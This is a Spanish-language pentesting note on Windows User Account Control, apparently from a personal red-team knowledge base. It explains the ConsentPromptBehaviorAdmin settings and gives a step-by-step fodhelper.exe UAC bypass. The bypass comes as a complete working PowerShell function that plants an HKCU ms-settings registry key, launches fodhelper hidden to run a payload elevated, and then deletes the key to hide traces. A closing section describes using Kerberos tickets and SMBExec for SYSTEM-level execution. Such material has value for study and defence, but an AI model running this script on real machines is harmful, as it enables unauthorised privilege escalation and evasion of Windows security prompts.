# Introducción a UAC

Tags: #AD #Evasion #Windows #UAC 

El Control de Cuentas de Usuario (UAC) se utiliza para permitir que un usuario con permisos de administrador otorgue privilegios elevados a procesos específicos. Esto se logra utilizando, de manera predeterminada, un token de bajo privilegio del usuario. Cuando el administrador ejecuta un proceso con privilegios elevados, se produce una elevación de UAC, y si esta se completa correctamente, el proceso se inicia utilizando el token con privilegios administrativos.

* [UAC](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/)

```bash 
Debemos enfocarnos en validar el valor de la clave ConsentPromptBehaviorAdmin.

- Si es cero entonces, UAC no se iniciará al abrir un programa como administrador (como deshabilitado).
- Si es 1, se le solicitara al administrador por el nombre de usuario y la contraseña para ejecutar el binario con altos derechos (en RDP).
- Si es 2 (Siempre se desplegará el UAC) UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con altos privilegios (en RDP).
- Si es 3, como 1 pero no es necesario en RDP.
- Si es 4, como 2 pero no es necesario en RDP.
- Si es 5 (por defecto) pedirá confirmación al administrador para ejecutar binarios no Windows con altos privilegios.
```

## Bypass UAC utilizando FodhelperUACBypass.ps1

`Fodhelper.exe` es un ejecutable de Windows que forma parte del sistema operativo y se encuentra en la carpeta `System32`. Este ejecutable está diseñado para permitir que los usuarios ejecuten funciones auxiliares del Panel de Control de Windows. Lo que es notable desde una perspectiva de seguridad es que `fodhelper.exe` se ejecuta con privilegios elevados sin provocar una solicitud de UAC, lo que proporciona una oportunidad tentadora para los actores de amenazas de eludir los controles de UAC.

* **Ambiente:** Sistema operativo Windows con UAC habilitado.
* **Privilegios:** Acceso inicial con privilegios de usuario estándar.

```bash 
# Procedimiento 

Paso 1: Manipulación del Registro de Windows
El primer paso para ejecutar el bypass de UAC usando 'fodhelper.exe' implica realizar cambios en el Registro de Windows. La técnica emplea la creación de claves de registro específicas que alteran el comportamiento de 'fodhelper.exe':
- Crear una nueva clave de registro en 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'.
- Establecer la propiedad '(default)' de la clave 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' para que apunte al payload malicioso que se desea ejecutar.
- Establecer la propiedad 'DelegateExecute' de la misma clave a una cadena vacía para asegurarse de que la cadena de comandos sea interpretada y ejecutada adecuadamente.

Paso 2: Ejecución de Fodhelper.exe
Posteriormente, cuando `fodhelper.exe` es ejecutado, Windows intenta abrir la aplicación asociada con la configuración y, debido a las manipulaciones realizadas en el registro, ejecutará el payload malicioso especificado con privilegios elevados sin presentar la notificación de UAC al usuario.

Paso 3: Limpieza
Tras la ejecución del payload, es prudente eliminar las claves de registro creadas para reducir los rastros de la actividad maliciosa y evitar posibles problemas derivados de la manipulación del registro.
```

## Implementación con PowerShell

```powershell
<#
.SYNOPSIS  
    This script can bypass User Access Control (UAC) via fodhelper.exe
　
    It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform UAC bypass and starts 
    an elevated command prompt. 
　
.EXAMPLE  
　
     Load "cmd /c start C:\Windows\System32\cmd.exe" (it's default):
     FodhelperUACBypass 
　
     Load specific application:
     FodhelperUACBypass -program "cmd.exe"
     FodhelperUACBypass -program "cmd.exe /c powershell.exe"　
#>

function FodhelperUACBypass(){ 
 Param (
           
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
       )
　
    #Create Registry Structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
　
    #Start fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
　
    #Cleanup
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
　
}
```

## Bypass utilizando Kerberos y SMBExec

```bash 
Kerberos es un protocolo de autenticación de red que utiliza tickets para ayudar a los usuarios a probar su identidad a través de una red insegura, como Internet. En el contexto del bypass de UAC, una vez que se han obtenido derechos de administrador local, un atacante o pentester puede utilizar Kerberos para solicitar un Ticket Granting Ticket (TGT) sin interactuar con el UAC.


Proceso de Solicitud de TGT
1. Solicitud Inicial: Con las credenciales de administrador local, el atacante solicita un TGT al Servicio de Ticket de Concesión (TGS) en el Controlador de Dominio (DC), especificando el servicio y usuario objetivo.
2. Recepción del TGT: Una vez que el DC valida las credenciales, un TGT es generado y enviado al solicitante. Este TGT es un token de acceso temporal que permite al usuario solicitar tickets de servicio para diferentes recursos en el dominio.
3. Uso del TGT: Utilizando el TGT, el atacante puede luego solicitar tickets de servicio para acceder a otros recursos y servicios dentro del dominio, sin necesidad de autenticación adicional.
```

```bash 
Una vez que un atacante tiene acceso a un TGT, pueden utilizar herramientas como SMBExec para establecer sesiones de autenticación con otros sistemas en la red, utilizando el protocolo SMB (Server Message Block).


SMBExec y Evasión de UAC
1. Establecimiento de Sesión SMB: Utilizando SMBExec, el atacante puede utilizar el TGT para autenticarse en otros sistemas en el dominio a través de SMB, un protocolo utilizado para compartir acceso a archivos, impresoras y otros recursos de red.
2. Escalada de Privilegios: Debido a que los tickets Kerberos pueden ser utilizados para la autenticación de nivel de sistema (NT AUTHORITY\SYSTEM), el atacante puede potencialmente establecer una sesión SMB con privilegios elevados en el sistema objetivo.
3. Ejecución de Código: Con una sesión de NT AUTHORITY\SYSTEM, el atacante tiene la capacidad de ejecutar código arbitrario, manipular servicios, y realizar otras acciones con el máximo nivel de privilegios en el sistema objetivo, todo ello sin interactuar con el UAC.
```